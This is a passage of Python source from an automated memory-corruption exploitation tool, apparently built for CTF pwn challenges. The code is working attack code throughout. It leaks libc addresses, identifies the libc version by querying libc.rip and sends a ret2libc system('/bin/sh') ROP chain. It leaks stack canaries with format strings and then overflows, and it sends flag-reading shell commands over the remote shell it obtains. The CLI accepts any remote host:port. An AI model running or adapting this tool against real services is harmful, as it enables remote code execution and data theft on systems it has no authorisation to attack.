                    if (addr & 0xfff) == low12:
                        matched.append((gname, addr))
                        remaining.remove(addr)
                        break
            return matched, remaining

        # We may not have libc_offsets yet (if auto-identifying),
        # so try matching after we resolve offsets.
        # For now, store all leaked addresses for later matching.
        # The primary leaked_addr (from _parse_leaked_addr) is our
        # first guess; we'll refine it below.

        # Default: use the first GOT function as primary leak
        leak_got_name = None
        for name in ['puts', 'printf', 'write', '__libc_start_main']:
            if name in self.analyzer.got:
                leak_got_name = name
                break

        extra_got_name = None
        extra_leaked_addr = None
        if len(leak_gots) >= 2:
            extra_got_name = leak_gots[1][0]
            # Find the second leaked address (different from primary)
            for addr in all_leaked_addrs:
                if addr != leaked_addr:
                    extra_leaked_addr = addr
                    break

        # ---- Auto libc identification ----
        # Set extra leak info for better libc.rip query precision
        if extra_leaked_addr and extra_got_name:
            self._extra_leak_info = (extra_got_name, extra_leaked_addr)
            print(C.info(f"Second leak: {extra_got_name} = {hex(extra_leaked_addr)}"))

        if not self.libc_offsets:
            # Try online lookup first
            print(C.sub("Auto-identifying libc version ..."))
            libc_info = self._lookup_libc_online(leak_got_name, leaked_addr)

            if libc_info and libc_info.get('system', 0) != 0:
                self.libc_offsets = libc_info
                print(C.hit("Libc identified online, offsets resolved"))
            else:
                # Fallback: try to use local libc file if provided
                libc_path = getattr(self, 'libc_path', None)
                if libc_path:
                    self.libc_offsets = self._get_libc_offsets_from_elf(libc_path)

                if not self.libc_offsets:
                    print(C.warn("Online lookup failed and no --libc specified"))
                    print(C.warn("Falling back to hardcoded Ubuntu 18.04 amd64 offsets"))
                    print(C.warn("(This will likely be WRONG - specify --libc-offsets "
                                 "or --libc for correct offsets)"))
                    self.libc_offsets = LIBC_OFFSETS["ubuntu18_amd64"]

        # ---- Re-match leaked addresses to GOT functions via low12-bit ----
        # Now that we have libc_offsets, we can precisely determine which
        # leaked address corresponds to which GOT function by comparing
        # the low 12 bits (page offset).
        got_names_for_match = [n for n, _ in leak_gots]
        matched, unmatched = _match_leak_to_got(
            all_leaked_addrs, got_names_for_match, self.libc_offsets)

        if matched:
            # Use the best-matched pair for base calculation
            best_name, best_addr = matched[0]
            if best_name != leak_got_name:
                print(C.info(f"Low12-bit remap: {leak_got_name} -> "
                             f"{best_name} (addr {hex(best_addr)}, "
                             f"low12={hex(best_addr & 0xfff)})"))
                leak_got_name = best_name
            # Always update leaked_addr to the correctly matched address
            if best_addr != leaked_addr:
                print(C.info(f"Low12-bit addr fix: {hex(leaked_addr)} -> "
                             f"{hex(best_addr)} (matched {best_name})"))
                leaked_addr = best_addr
            # Update extra leak if matched
            if len(matched) >= 2:
                extra_got_name = matched[1][0]
                extra_leaked_addr = matched[1][1]

        # Calculate libc base
        libc_func_offset = self.libc_offsets.get(leak_got_name, 0)
        if libc_func_offset == 0:
            # Try alternate keys (libc.rip uses 'str_bin_sh' vs our 'binsh')
            for alt_key in [leak_got_name, leak_got_name]:
                if alt_key in self.libc_offsets:
                    libc_func_offset = self.libc_offsets[alt_key]
                    break

        if libc_func_offset == 0:
            print(C.err(f"No offset for {leak_got_name} in resolved libc database"))
            print(C.info("Please specify --libc-offsets manually"))
            io.close()
            return

        libc_base = leaked_addr - libc_func_offset
        self.leaked_libc_base = libc_base
        print(C.hit(f"Libc base: {hex(libc_base)}"))

        # Verify libc base is page-aligned (sanity check)
        if libc_base & 0xfff != 0:
            print(C.warn(f"Libc base not page-aligned! ({hex(libc_base)}) "
                         f"Possible wrong libc version"))

        # Build stage 2
        ret_gadget = None
        for name, addr in self.analyzer.gadgets:
            if name == 'ret':
                ret_gadget = addr
                break

        # For x64, we need pop rdi gadget. If not in binary, try libc.
        pop_rdi_from_libc = None
        has_pop_rdi_in_binary = any(
            g[0] == 'pop rdi; ret' for g in self.analyzer.gadgets)

        if not has_pop_rdi_in_binary and self.analyzer.bits == 64:
            print(C.info("No pop rdi in binary, searching in libc ..."))
            # Common pop rdi; ret offsets in libc (by version)
            pop_rdi_offset = self.libc_offsets.get('pop_rdi', 0)
            if pop_rdi_offset == 0:
                # Try to find it from libc.rip result (not always available)
                # Use well-known offsets for common libcs
                pop_rdi_offset = self._find_pop_rdi_in_libc_offsets()
            if pop_rdi_offset == 0:
                # Try searching the libc ELF if provided
                libc_path = getattr(self, 'libc_path', None)
                if libc_path:
                    pop_rdi_offset = self._search_pop_rdi_in_libc_elf(libc_path)
            if pop_rdi_offset != 0:
                pop_rdi_from_libc = libc_base + pop_rdi_offset
                print(C.hit(f"Found pop rdi in libc at {hex(pop_rdi_from_libc)}"))
            else:
                print(C.warn("Cannot find pop rdi gadget. Specify --libc for "
                             "automatic gadget search"))

        system_off = self.libc_offsets.get('system', 0)
        binsh_off = self.libc_offsets.get('binsh', 0)

        if system_off == 0 or binsh_off == 0:
            print(C.err("Missing system or /bin/sh offset in libc database"))
            io.close()
            return

        stage2, desc2 = self.builder.ret2libc_stage2(
            self.offset, libc_base,
            system_off,
            binsh_off,
            ret_gadget,
            pop_rdi_addr=pop_rdi_from_libc)

        print(C.info(f"Sending stage 2 ({len(stage2)} bytes): {desc2}"))

        # Wait for program to restart vuln and prompt for input
        # The program flow after stage1: puts(Thanks!) -> puts(leaked) -> main() -> vuln() -> prompt
        # Try to wait for the actual input prompt (not hardcoded "Your input:")
        stage2_prompt = prompt_bytes if prompt_bytes else b"Your input:"
        try:
            io.recvuntil(stage2_prompt, timeout=5)
            print(C.sub("Program restarted, ready for stage 2"))
        except Exception:
            # Fallback: just wait
            time.sleep(1)
            try:
                io.recv(timeout=1)
            except:
                pass

        io.sendline(stage2)

        # After stage2, immediately send flag-reading commands.
        # Many CTF platforms (e.g. DASCTF) have timeout monitors that kill
        # the process quickly, so system("/bin/sh") may not stay interactive.
        # By sending commands right away via stdin, the shell can execute
        # them before the timeout kills the process.
        time.sleep(0.3)

        # If --cmd specified, use that command instead of default flag search
        if cmd:
            flag_cmds = [cmd.encode() if isinstance(cmd, str) else cmd]
        else:
            flag_cmds = [
                b'id',
                b'cat /flag*',
                b'cat /home/*/flag*',
                b'cat flag*',
                b'ls -la /',
            ]
        for _fcmd in flag_cmds:
            try:
                io.sendline(_fcmd)
                time.sleep(0.1)
            except Exception:
                break

        if interactive:
            # Wait briefly for flag command output
            time.sleep(1.0)
            try:
                initial = io.recvrepeat(2)
                if initial:
                    decoded = initial.decode('utf-8', errors='replace')
                    print(C.sub(f"Output:\n{decoded.strip()[:2000]}"))
                    flags = self._extract_flags(initial)
                    for f in flags:
                        print(C.flag(f))
                    if flags:
                        print(C.hit("Flag found! (still dropping to interactive)"))
            except Exception:
                pass

            # Send a test command to verify shell is alive
            try:
                io.sendline(b'echo PWN_ARCANUM_SHELL_OK')
                time.sleep(0.5)
                check = io.recv(timeout=2)
                if b'PWN_ARCANUM_SHELL_OK' in check:
                    print(C.hit("Shell confirmed alive!"))
                else:
                    print(C.warn(f"Unexpected response: {check}"))
            except Exception:
                print(C.warn("No shell response, trying interactive anyway..."))

            print(C.hit("Switching to interactive mode"))
            try:
                io.interactive()
            except KeyboardInterrupt:
                print("\n" + C.info("Exiting"))
        else:
            data = self._recv_all_safe(io)
            if data:
                print(C.hit(f"Received: {data.decode('utf-8', 'replace')}"))
                flags = self._extract_flags(data)
                for f in flags:
                    print(C.flag(f))

        io.close()

    def _recv_all_safe(self, io, timeout=5):
        """Receive all data reliably across platforms.

        Uses recvrepeat (silent-timeout based) instead of recvall (EOF based).
        On macOS, SSL connections may close uncleanly on remote crash,
        causing recvall to miss final buffered data. recvrepeat keeps
        calling recv until a silent timeout, collecting all segments.
        """
        try:
            time.sleep(0.3)
            data = io.recvrepeat(timeout)
        except Exception:
            try:
                data = io.recvall(timeout=3)
            except Exception:
                data = b''
        return data

    def _parse_leaked_addr(self, data, wait_for_prompt=None):
        """Parse a leaked address from received data.

        The data may contain text output (like "Thanks!\\n") followed by
        raw bytes representing the leaked libc address. We search through
        the data for what looks like a valid libc address.

        Args:
            data: raw received bytes
            wait_for_prompt: if provided, the data was received via recvuntil(prompt)
                and we should strip the prompt suffix before parsing.

        Important: leaked addresses may contain 0x0a (newline) bytes, which
        can split the address across multiple 'lines' in the received data.
        We must handle this by searching for 6-byte sequences with 0x7f in
        the correct position, not by using recvline().
        """
        if not data:
            return None

        raw = data

        # Strip trailing prompt if we used recvuntil
        if wait_for_prompt and raw.endswith(wait_for_prompt.encode('utf-8', errors='replace') if isinstance(wait_for_prompt, str) else wait_for_prompt):
            prompt_bytes = wait_for_prompt.encode('utf-8', errors='replace') if isinstance(wait_for_prompt, str) else wait_for_prompt
            raw = raw[:-len(prompt_bytes)]

        if self.analyzer.bits == 64:
            # For x64, we look for a 6-byte sequence that looks like a libc address
            # Libc addresses are typically 0x7fXX XX XX XX XX with 6 significant bytes
            #
            # CRITICAL: The address bytes may contain 0x0a (newline), which means
            # the leaked address could be split across 'lines' in the output.
            # We must search the raw bytes, not line-split data.
            #
            # Typical libc address in LE: XX XX XX XX XX 7f 00 00
            # If one of the XX bytes is 0x0a, puts() still outputs it as-is,
            # but line-based receivers (recvline) would truncate at 0x0a.
            # Since we receive raw bytes, we search for the 0x7f byte at position [5]
            # in a 6-byte window.

            # First, try to find address with 0x7f at byte[5] (standard libc layout)
            for i in range(len(raw) - 5, -1, -1):
                chunk = raw[i:i+6]
                if len(chunk) < 6:
                    continue
                addr_bytes = chunk + b'\x00\x00'
                addr = struct.unpack('<Q', addr_bytes)[0]
                # Check if this looks like a libc address
                if 0x7f0000000000 <= addr <= 0x7fffffffffff:
                    return addr

            # Fallback: search forward for any plausible address
            for i in range(len(raw) - 5):
                chunk = raw[i:i+6]
                if len(chunk) < 6:
                    continue
                addr_bytes = chunk + b'\x00\x00'
                addr = struct.unpack('<Q', addr_bytes)[0]
                if 0x7f0000000000 <= addr <= 0x7fffffffffff:
                    return addr

            # Fallback: try last 6 bytes (strip trailing newlines/spaces)
            cleaned = raw.rstrip(b'\n\r ')
            if len(cleaned) >= 6:
                addr_bytes = cleaned[-6:] + b'\x00\x00'
                return struct.unpack('<Q', addr_bytes)[0]
            if len(raw) >= 6:
                addr_bytes = raw[-6:] + b'\x00\x00'
                return struct.unpack('<Q', addr_bytes)[0]
        else:
            # 32-bit: look for a libc address (0xf7XXXXXX range typically)
            for i in range(len(raw) - 3, -1, -1):
                chunk = raw[i:i+4]
                if len(chunk) < 4:
                    continue
                addr = struct.unpack('<I', chunk)[0]
                if 0xf7000000 <= addr <= 0xffffffff:
                    return addr
            if len(raw) >= 4:
                return struct.unpack('<I', raw[-4:])[0]
        return None

    def _extract_flags(self, data):
        """Extract flags from received data."""
        if isinstance(data, bytes):
            data = data.decode('utf-8', errors='replace')
        flags = []
        patterns = [
            r'flag\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'CTF2\{[^}]+\}',
            r'DASCTF\{[^}]+\}',
            r'key\{[^}]+\}',
            r'GWHT\{[^}]+\}',
            r'BJD\{[^}]+\}',
            r'bjd\{[^}]+\}',
        ]
        for p in patterns:
            flags.extend(re.findall(p, data, re.I))
        return list(dict.fromkeys(flags))

    # -----------------------------------------------------------------
    # Libc identification (online lookup via libc.rip / libc-database.cloud)
    # -----------------------------------------------------------------
    def _lookup_libc_online(self, leaked_func_name, leaked_addr):
        """Query libc.rip API to identify libc version from a leaked address.

        Args:
            leaked_func_name: name of the leaked function (e.g. 'puts', 'printf')
            leaked_addr: leaked runtime address of that function

        Returns: dict with keys 'system', 'binsh', 'puts', 'id' etc, or None
        """
        # The libc.rip API expects the function's offset in libc as the value.
        # We only know the low 12 bits (page offset) for sure.
        # But we can also compute the full offset if we assume libc base is page-aligned.
        # For better precision, we send the full offset (leaked_addr with ASLR bits)
        # The API actually does suffix matching, so sending the last N hex digits works.

        # Strategy 1: Send full offset (low 20 bits = 5 hex digits) for better precision
        offset_in_libc = leaked_addr & 0xfffff  # low 20 bits
        symbols = {leaked_func_name: hex(offset_in_libc)}

        # If we have a second leak, add it for cross-verification
        extra_leak = getattr(self, '_extra_leak_info', None)
        if extra_leak:
            symbols[extra_leak[0]] = hex(extra_leak[1] & 0xfffff)

        api_url = "https://libc.rip/api/find"
        payload = json.dumps({"symbols": symbols}).encode('utf-8')

        sym_desc = ', '.join(f'{k}=0x{v}' for k, v in symbols.items())
        print(C.info(f"Querying libc.rip: {sym_desc}"))

        try:
            req = urllib.request.Request(
                api_url,
                data=payload,
                headers={"Content-Type": "application/json"},
                method="POST")
            resp = urllib.request.urlopen(req, timeout=10)
            result = json.loads(resp.read().decode('utf-8'))
        except urllib.error.URLError as e:
            print(C.warn(f"libc.rip API unreachable: {e}"))
            print(C.info("Falling back to hardcoded libc database"))
            return None
        except Exception as e:
            print(C.warn(f"libc.rip query failed: {e}"))
            return None

        if not result or not isinstance(result, list) or len(result) == 0:
            # Try again with just 3 hex digits (lower precision, more matches)
            offset_in_libc = leaked_addr & 0xfff
            symbols = {leaked_func_name: hex(offset_in_libc)}
            if extra_leak:
                symbols[extra_leak[0]] = hex(extra_leak[1] & 0xfff)
            payload = json.dumps({"symbols": symbols}).encode('utf-8')
            sym_desc = ', '.join(f'{k}=0x{v}' for k, v in symbols.items())
            print(C.info(f"Retrying with lower precision: {sym_desc}"))
            try:
                req = urllib.request.Request(
                    api_url, data=payload,
                    headers={"Content-Type": "application/json"},
                    method="POST")
                resp = urllib.request.urlopen(req, timeout=10)
                result = json.loads(resp.read().decode('utf-8'))
            except Exception:
                return None
            if not result or not isinstance(result, list) or len(result) == 0:
                print(C.warn("No matching libc found on libc.rip"))
                return None

        # Filter results: prefer amd64 if our binary is 64-bit
        if self.analyzer.bits == 64:
            amd64_results = [r for r in result if 'amd64' in r.get('id', '')]
            if amd64_results:
                result = amd64_results
        elif self.analyzer.bits == 32:
            i386_results = [r for r in result if 'i386' in r.get('id', '') or 'i586' in r.get('id', '') or 'i686' in r.get('id', '')]
            if i386_results:
                result = i386_results

        # Pick the first (best) match
        match = result[0]
        libc_id = match.get('id', 'unknown')
        syms = match.get('symbols', {})

        # Extract offsets
        def _hex(s):
            return int(s, 16) if isinstance(s, str) else int(s)

        info = {
            'id': libc_id,
            'system': _hex(syms.get('system', '0')),
            'binsh': _hex(syms.get('str_bin_sh', syms.get('binsh', '0'))),
            'puts': _hex(syms.get('puts', '0')),
            'printf': _hex(syms.get('printf', '0')),
            'write': _hex(syms.get('write', '0')),
            '__libc_start_main': _hex(syms.get('__libc_start_main_ret',
                                    syms.get('__libc_start_main', '0'))),
        }

        print(C.hit(f"Libc identified: {libc_id}"))
        print(C.info(f"  system  offset: {hex(info['system'])}"))
        print(C.info(f"  /bin/sh offset: {hex(info['binsh'])}"))
        print(C.info(f"  puts    offset: {hex(info['puts'])}"))

        # Also store all matched versions for reference
        if len(result) > 1:
            print(C.sub(f"  ({len(result)} total matches, using first)"))

        return info

    def _get_libc_offsets_from_elf(self, libc_path):
        """Extract system/binsh/pop_rdi offsets from a local libc ELF file.

        Args:
            libc_path: path to the libc.so file

        Returns: dict with 'system', 'binsh', 'pop_rdi', etc offsets, or None
        """
        try:
            from pwn import ELF as PwnELF
            libc = PwnELF(libc_path, checksec=False)
            offsets = {
                'system': libc.symbols.get('system', 0),
                'binsh': 0,
                'puts': libc.symbols.get('puts', 0),
                'printf': libc.symbols.get('printf', 0),
                '__libc_start_main': libc.symbols.get('__libc_start_main', 0),
                '__libc_start_main_ret': 0,
                'pop_rdi': 0,
            }
            # Find /bin/sh string
            try:
                binsh = next(libc.search(b'/bin/sh\x00'))
                offsets['binsh'] = binsh
            except StopIteration:
                pass
            # Find __libc_start_main_ret: the return address from
            # __libc_start_main is typically a few instructions after its entry.
            # In glibc 2.34+, __libc_start_main calls main() via
            # __libc_start_call_main, and the return address is where
            # main() returns to. We search for it by finding the
            # "call r15" or "call r12" instruction inside __libc_start_main
            # that calls main, and the instruction after it is the ret addr.
            lsm = offsets.get('__libc_start_main', 0)
            if lsm:
                try:
                    code = libc.read(lsm, 0x300)
                    # Search for call r15 (41 ff d7) or call r12 (41 ff d4)
                    # or call rax (ff d0) that calls main
                    for i in range(len(code) - 2):
                        # call r15 = 41 ff d7
                        if (code[i] == 0x41 and code[i+1] == 0xff
                                and code[i+2] in [0xd4, 0xd5, 0xd6, 0xd7]):
                            offsets['__libc_start_main_ret'] = lsm + i + 3
                            break
                        # call rax = ff d0
                        if code[i] == 0xff and code[i+1] in [0xd0, 0xd2, 0xd3]:
                            offsets['__libc_start_main_ret'] = lsm + i + 2
                            break
                except Exception:
                    pass
                if offsets['__libc_start_main_ret'] == 0:
                    # Fallback heuristic
                    offsets['__libc_start_main_ret'] = lsm + 0x20
            # Find pop rdi; ret (0x5f 0xc3) in libc
            try:
                pop_rdi_off = next(libc.search(b'\x5f\xc3'))
                offsets['pop_rdi'] = pop_rdi_off
            except StopIteration:
                pass
            print(C.hit(f"Loaded libc offsets from {libc_path}"))
            print(C.info(f"  system  offset: {hex(offsets['system'])}"))
            print(C.info(f"  /bin/sh offset: {hex(offsets['binsh'])}"))
            print(C.info(f"  pop_rdi offset: {hex(offsets['pop_rdi'])}"))
            if offsets['__libc_start_main']:
                print(C.info(f"  __libc_start_main offset: "
                            f"{hex(offsets['__libc_start_main'])}"))
            return offsets
        except Exception as e:
            print(C.err(f"Failed to parse libc ELF: {e}"))
            return None

    def _find_pop_rdi_in_libc_offsets(self):
        """Find pop rdi; ret offset in libc from known offsets database.

        Returns: offset (int) if found, 0 otherwise.
        """
        # pop rdi; ret = 5f c3 in x86-64 libc
        # Common offsets by libc version (last 3 hex digits of the offset)
        POP_RDI_OFFSETS = {
            # Ubuntu 18.04 glibc 2.27
            "ubuntu18_amd64": 0x2155f,
            # Ubuntu 20.04 glibc 2.31
            "ubuntu20_amd64": 0x26b72,
            # Ubuntu 22.04 glibc 2.35
            "ubuntu22_amd64": 0x2a3e5,
            # Ubuntu 24.04 glibc 2.39
            "ubuntu24_amd64": 0x2e6c5,
            # Debian 12 glibc 2.36
            "debian12_amd64": 0x277e5,
        }

        # Try to match by libc offsets
        libc_puts_off = self.libc_offsets.get('puts', 0)
        libc_id = getattr(self.libc_offsets, 'get', lambda k, d: d)
        libc_id_str = self.libc_offsets.get('id', '')

        # If we know the libc id from online lookup, try to extract
        if libc_id_str:
            for key, off in POP_RDI_OFFSETS.items():
                if key in libc_id_str:
                    self.libc_offsets['pop_rdi'] = off
                    return off

        # Heuristic: match by puts offset
        KNOWN_PUTS_OFFSETS = {
            0x809c0: 0x2155f,  # Ubuntu 18.04
            0x875a0: 0x26b72,  # Ubuntu 20.04
            0x80ed0: 0x2a3e5,  # Ubuntu 22.04 (approx)
        }
        if libc_puts_off in KNOWN_PUTS_OFFSETS:
            return KNOWN_PUTS_OFFSETS[libc_puts_off]

        # Last resort: try libc.rip for pop_rdi offset
        # (The API response already has system/binsh, but not pop_rdi)
        # We could do a second query, but that's overkill for now.
        return 0

    def _try_get_flag(self, io):
        """Try to read flag after getting a shell.

        Sends multiple flag-read commands and extracts any flags found.
        Returns True if a flag was found.
        """
        flag_cmds = [
            b'cat /flag 2>/dev/null',
            b'cat flag.txt 2>/dev/null',
            b'cat /flag.txt 2>/dev/null',
            b'cat /home/*/flag* 2>/dev/null',
            b'find / -name "flag*" -exec cat {} \\; 2>/dev/null',
            b'ls -la /flag* /home/*/flag* 2>/dev/null',
        ]

        for _fcmd in flag_cmds:
            try:
                io.sendline(_fcmd)
                time.sleep(0.5)
                data = io.recv(timeout=2)
                if data:
                    decoded = data.decode('utf-8', errors='replace').strip()
                    if decoded:
                        print(C.hit(f"Output: {decoded}"))
                    flags = self._extract_flags(data)
                    if flags:
                        for f in flags:
                            print(C.flag(f))
                        return True
            except Exception:
                continue
        return False

    def _probe_canary(self, io, canary_offset):
        """Send %N$p format string and check if the leaked value looks like
        a canary.

        A valid canary on Linux:
        - 64-bit: low byte is 0x00 (null terminator), upper bytes non-zero
        - 32-bit: low byte is 0x00, upper bytes non-zero
        - Value is typically 7 bytes of random data + 1 null byte

        Returns the canary int value if valid, None otherwise.
        """
        fmt = f'%{canary_offset}$p'.encode()
        try:
            io.sendline(fmt)
        except Exception:
            return None

        try:
            leaked = io.recv(timeout=3)
        except Exception:
            return None

        decoded = leaked.decode('utf-8', errors='replace').strip()
        if not decoded:
            return None

        # Parse hex value
        canary_value = None
        hex_match = re.search(r'0x([0-9a-fA-F]+)', decoded)
        if hex_match:
            canary_value = int(hex_match.group(0), 16)
        else:
            hex_match2 = re.search(r'^([0-9a-fA-F]{8,16})$', decoded.strip())
            if hex_match2:
                canary_value = int(hex_match2.group(1), 16)

        if canary_value is None:
            return None

        # Check canary signature: low byte must be 0x00
        # and remaining bytes must be non-zero (not 0x0, not (nil), not a small number)
        if canary_value == 0:
            return None

        low_byte = canary_value & 0xFF
        if low_byte != 0:
            # On some occasions the canary might not end with \x00 when
            # printed as %p (it could be a truncated value). But usually
            # the canary's least significant byte is \x00.
            return None

        # Also check it's not a typical small value (like a pointer to low memory)
        # Canary values are large random numbers
        if canary_value < 0x100:
            return None

        print(C.info(f"  %{canary_offset}$p = {hex(canary_value)} "
                     f"(looks like canary: low byte=0x00)"))
        return canary_value

    def _run_canary_leak_remote(self, host, port, interactive):
        """Run two-stage canary_leak exploit.

        Stage 1: Send format string (%N$p) to leak canary value.
        Stage 2: Send overflow payload with leaked canary + win function address.

        If the auto-detected canary offset doesn't yield a valid canary,
        falls back to probing offsets 6..20 to find the canary.
        """
        print(C.info(f"Stage 1: Leaking canary from {host}:{port}"
              + (" (SSL)" if getattr(self, 'use_ssl', False) else "")))

        try:
            io = remote(host, port, ssl=getattr(self, 'use_ssl', False), timeout=15)
        except Exception as e:
            print(C.err(f"Connection failed: {e}"))
            return

        # Receive banner if any
        try:
            banner = io.recv(timeout=3)
            if banner:
                print(C.sub(f"Banner: {banner.decode('utf-8', errors='replace').strip()}"))
        except Exception:
            pass

        # Send format string to leak canary
        canary_offset = getattr(self, 'canary_offset', None)
        if canary_offset is None:
            canary_offset = self.analyzer.canary_stack_offset or 11

        canary_value = self._probe_canary(io, canary_offset)

        if canary_value is None:
            print(C.warn(f"Offset %{canary_offset}$p did not yield a canary. "
                         f"Auto-probing offsets 6..20..."))
            io.close()

            # Try probing different offsets
            for test_offset in range(6, 21):
                if test_offset == canary_offset:
                    continue
                try:
                    io = remote(host, port,
                                ssl=getattr(self, 'use_ssl', False), timeout=15)
                except Exception:
                    continue
                try:
                    io.recv(timeout=2)  # banner
                except Exception:
                    pass

                canary_value = self._probe_canary(io, test_offset)
                io.close()

                if canary_value is not None:
                    canary_offset = test_offset
                    print(C.hit(f"Found canary at %{canary_offset}$p!"))
                    break

            if canary_value is None:
                print(C.err("Failed to find canary via format string probing "
                            "(offsets 6..20). Manual --canary-offset needed."))
                return

            # Reconnect for stage 2 (leak + overflow)
            try:
                io = remote(host, port,
                            ssl=getattr(self, 'use_ssl', False), timeout=15)
            except Exception as e:
                print(C.err(f"Reconnect failed: {e}"))
                return
            try:
                io.recv(timeout=2)  # banner
            except Exception:
                pass

            # Leak canary with the correct offset
            canary_value = self._probe_canary(io, canary_offset)
            if canary_value is None:
                print(C.err("Failed to leak canary on reconnect"))
                io.close()
                return

        print(C.hit(f"Canary value: {hex(canary_value)}"))

        # Build stage 2 payload
        win_name = getattr(self, 'canary_win_func', None)
        no_align = getattr(self, 'canary_no_align', False)
        stage2, desc2 = self.builder.canary_leak_stage2(
            self.offset, canary_value,
            win_name=win_name, no_align=no_align)

        if stage2 is None:
            print(C.err(f"Stage 2 failed: {desc2}"))
            io.close()
            return

        print(C.info(f"Sending stage 2 ({len(stage2)} bytes): {desc2}"))

        # Wait for the program to prompt for second input
        time.sleep(0.5)
        try:
            io.recv(timeout=1)
        except Exception:
            pass

        io.sendline(stage2)

        # Check if this is a "cat flag" style or shell
        is_cat_flag = (
            hasattr(self.analyzer, 'cat_flag_gadgets') and
            self.analyzer.cat_flag_gadgets
        )

        if is_cat_flag:
            print(C.info("cat-flag gadget detected, waiting for output ..."))
            data = self._recv_all_safe(io)
            if data:
                decoded_out = data.decode('utf-8', errors='replace')
                print(C.hit(f"Output:\n{decoded_out}"))
                flags = self._extract_flags(data)
                if flags:
                    for f in flags:
                        print(C.flag(f))
                else:
                    print(C.warn("No flag pattern found in output"))
            else:
                print(C.warn("No output received after payload"))
            io.close()
            return

        # Shell-based exploit
        if interactive:
            time.sleep(0.3)
            try:
                initial = io.recv(timeout=1)
                if initial:
                    print(C.sub(f"Initial output: {initial.decode('utf-8', errors='replace').strip()}"))
            except Exception:
                pass

            # Verify shell is alive
            try:
                io.sendline(b'echo PWN_ARCANUM_SHELL_OK')
                time.sleep(0.5)
                check = io.recv(timeout=2)
                if b'PWN_ARCANUM_SHELL_OK' in check:
                    print(C.hit("Shell confirmed alive!"))
                    self._try_get_flag(io)
                else:
                    print(C.warn(f"Unexpected response: {check}"))
            except Exception:
                print(C.warn("No shell response, trying interactive anyway..."))

            print(C.hit("Switching to interactive mode (Ctrl+C to exit)"))
            try:
                io.interactive()
            except KeyboardInterrupt:
                print("\n" + C.info("Exiting interactive mode"))
        else:
            data = self._recv_all_safe(io)
            if data:
                print(C.hit(f"Received: {data.decode('utf-8', errors='replace')}"))
                flags = self._extract_flags(data)
                for f in flags:
                    print(C.flag(f))

        io.close()


# ===================================================================
# CLI Entry Point
# ===================================================================
def main():
    parser = argparse.ArgumentParser(
        description='PWN Arcanum v1.9 - Automated PWN Analysis & Exploitation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Analyze binary only (static analysis)
  python pwn_arcanum.py ./pwn

  # Auto strategy, remote exploitation (auto-identifies libc for ret2libc)
  python pwn_arcanum.py ./pwn --remote host:port

  # Local testing mode (auto-spawn binary with socat)
  python pwn_arcanum.py ./pwn --local

  # Specific strategy
  python pwn_arcanum.py ./pwn --remote host:port --strategy ret2text
  python pwn_arcanum.py ./pwn --offset 112 --strategy ret2shellcode --sc-addr 0x404060

  # ret2libc with explicit libc file (auto-extract offsets)
  python pwn_arcanum.py ./pwn --remote host:port --strategy ret2libc --libc /lib/x86_64-linux-gnu/libc.so.6

  # ret2libc with custom offsets (fallback)
  python pwn_arcanum.py ./pwn --remote host:port --strategy ret2libc \\
      --libc-offsets system=0x4f440,binsh=0x1b3e1a,puts=0x809c0

  # canary_leak: leak canary via format string, then overflow
  python pwn_arcanum.py ./pwn --remote host:port --ssl \\
      --strategy canary_leak --canary-offset 11 --offset 24 --func backdoor

  # i386 ret2text with args (cdecl calling convention)
  python pwn_arcanum.py ./pwn3ds --offset 56 --strategy ret2text \\
      --func get_flag --args 0x308cd64f,0x195719d1 --dump

  # Just generate payload, don't connect
  python pwn_arcanum.py ./pwn --offset 12 --strategy ret2text --func win --dump

Strategies:
  auto         Auto-detect best strategy (default)
  ret2text     Call win/backdoor function
  ret2shellcode Jump to shellcode on stack/bss
  ret2syscall  ROP chain for execve (need gadgets + /bin/sh)
  ret2libc     Leak libc + system("/bin/sh") (two-stage, auto libc-id)
  canary_leak  Format-string leak canary + stack overflow bypass (two-stage)
""")
    parser.add_argument('binary', help='Target binary file path')
    parser.add_argument('--remote', '-r', metavar='HOST:PORT',
                        help='Remote target (e.g., 1.2.3.4:9999)')
    parser.add_argument('--strategy', '-s', default='auto',
                        choices=['auto', 'ret2text', 'ret2shellcode',
                                 'ret2syscall', 'ret2csu', 'ret2libc',
                                 'canary_leak'],
                        help='Exploitation strategy (default: auto)')
    parser.add_argument('--offset', '-o', type=int, default=None,
                        help='Overflow offset to return address (for canary_leak: offset to canary)')
    parser.add_argument('--func', '-f', default=None,
                        help='Win function name (for ret2text / canary_leak)')
    parser.add_argument('--sc-addr', type=str, default=None,
                        help='Shellcode address (for ret2shellcode)')
    parser.add_argument('--args', type=str, default=None,
                        help='Function args, comma-separated hex (for ret2text)')
    parser.add_argument('--libc-offsets', type=str, default=None,
                        help='Libc offsets: system=0xXXX,binsh=0xXXX,puts=0xXXX')
    parser.add_argument('--libc', type=str, default=None,
                        help='Target libc ELF file (auto-extract system/binsh offsets)')
    parser.add_argument('--canary-offset', type=int, default=None,
                        help='Canary position in printf args (N in %%N$p) for canary_leak')
    parser.add_argument('--no-align', action='store_true',
                        help='Skip x86-64 stack alignment ret gadget insertion')
    parser.add_argument('--dump', action='store_true',
                        help='Dump payload as hex, do not connect')
    parser.add_argument('--local', action='store_true',
                        help='Local test mode: auto-spawn binary with socat on localhost')
    parser.add_argument('--no-interactive', action='store_true',
                        help='Do not enter interactive mode')
    parser.add_argument('--ssl', action='store_true',
                        help='Use SSL/TLS for remote connection (ncat --ssl)')
    parser.add_argument('--cmd', metavar='COMMAND',
                        help='Command to execute via shell instead of interactive '
                             '(e.g. "cat /flag*"). Auto-sends after stage2.')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Verbose output')

    args = parser.parse_args()

    print(BANNER)

    # Parse remote
    host, port = None, None
    if args.remote:
        if ':' in args.remote:
            host, port = args.remote.rsplit(':', 1)
            port = int(port)
        else:
            host = args.remote
            port = 9999

    # Parse shellcode addr
    sc_addr = None
    if args.sc_addr:
        sc_addr = int(args.sc_addr, 0)

    # Parse function args
    func_args = None
    if args.args:
        func_args = [int(x, 0) for x in args.args.split(',')]

    # Parse libc offsets
    libc_offsets = None
    if args.libc_offsets:
        libc_offsets = {}
        for kv in args.libc_offsets.split(','):
            k, v = kv.split('=')
            libc_offsets[k.strip()] = int(v, 0)

    # Parse --libc: extract offsets from local libc ELF
    libc_path = args.libc
    if libc_path and not libc_offsets:
        # Will be loaded lazily (requires pwntools ELF)
        pass  # handled below after engine init

    # Initialize engine
    engine = PWNArcanum(args.binary, verbose=args.verbose)
